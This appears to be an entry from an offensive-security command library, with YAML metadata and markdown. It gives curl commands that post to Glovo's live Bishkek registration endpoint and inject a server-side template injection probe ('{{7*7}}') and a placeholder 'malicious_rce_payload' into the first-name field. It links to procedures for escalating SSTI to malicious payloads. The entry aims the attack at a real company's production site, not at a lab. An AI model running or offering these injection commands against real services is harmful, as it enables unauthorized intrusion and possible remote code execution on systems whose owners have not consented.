---
data: >-
  curl -X POST https://www.glovoapp.com/kg/en/bishkek/register -d
  'first_name={{payload}}' -d 'email=your@email.com' -d 'password=yourpassword'
tags:
  - web
  - injection
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: b6f7c46a-9cfb-4fbc-b143-7d22455072ec
created_at: '2025-12-13T09:01:16.954Z'
updated_at: '2025-12-13T09:01:16.954Z'
verified: false
validated: true
submitted: true
---
# Curl Submit Registration Form

## Command

```bash
curl -X POST https://www.glovoapp.com/kg/en/bishkek/register -d 'first_name={{payload}}' -d 'email=your@email.com' -d 'password=yourpassword'
```

## Description

Submits a POST request to the Glovo registration endpoint with custom data, useful for injecting payloads into form fields like First Name.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-d 'first_name={{payload}}'` | Injects payload into First Name | Yes |
| `-d 'email=your@email.com'` | Provides email | Yes |
| `-d 'password=yourpassword'` | Provides password | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://www.glovoapp.com/kg/en/bishkek/register -d 'first_name={{7*7}}' -d 'email=test@example.com' -d 'password=pass123'
```

### Advanced Usage

```bash
curl -X POST https://www.glovoapp.com/kg/en/bishkek/register -d 'first_name={{malicious_rce_payload}}' -d 'email=test@example.com' -d 'password=pass123' --header 'Content-Type: application/x-www-form-urlencoded'
```

## Expected Output

HTTP response indicating successful form submission and account creation.

## Related

- [[procedures/Register-Account-with-SSTI-Payload]]
- [[procedures/Escalate-SSTI-to-Malicious-Payloads]]
